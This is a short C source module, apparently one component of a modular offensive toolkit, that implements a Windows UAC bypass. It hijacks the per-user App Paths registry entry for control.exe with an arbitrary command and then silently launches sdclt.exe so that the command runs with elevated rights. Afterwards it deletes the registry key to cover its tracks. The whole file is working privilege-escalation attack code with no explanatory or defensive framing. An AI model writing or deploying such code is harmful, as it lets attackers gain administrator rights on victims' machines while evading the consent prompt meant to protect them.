// chunk: privesc/uac_sdclt
// depends: (none)
// provides: uac_bypass_sdclt
// note: UAC bypass via sdclt.exe — App Paths registry hijack

#ifndef CHUNK_PRIVESC_UAC_SDCLT
#define CHUNK_PRIVESC_UAC_SDCLT

static int uac_bypass_sdclt(const char *cmd_to_run) {
    HKEY hKey;
    const char *keyPath = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths\\control.exe";

    if (RegCreateKeyExA(HKEY_CURRENT_USER, keyPath, 0, NULL,
                        REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL,
                        &hKey, NULL) != ERROR_SUCCESS) {
        return 0;
    }

    RegSetValueExA(hKey, NULL, 0, REG_SZ, (BYTE*)cmd_to_run, (DWORD)strlen(cmd_to_run) + 1);
    RegCloseKey(hKey);

    SHELLEXECUTEINFOA sei = {0};
    sei.cbSize = sizeof(sei);
    sei.lpVerb = "open";
    sei.lpFile = "C:\\Windows\\System32\\sdclt.exe";
    sei.nShow = SW_HIDE;
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;

    BOOL result = ShellExecuteExA(&sei);

    if (sei.hProcess) {
        WaitForSingleObject(sei.hProcess, 5000);
        CloseHandle(sei.hProcess);
    }

    RegDeleteKeyA(HKEY_CURRENT_USER, keyPath);

    return result ? 1 : 0;
}

#endif
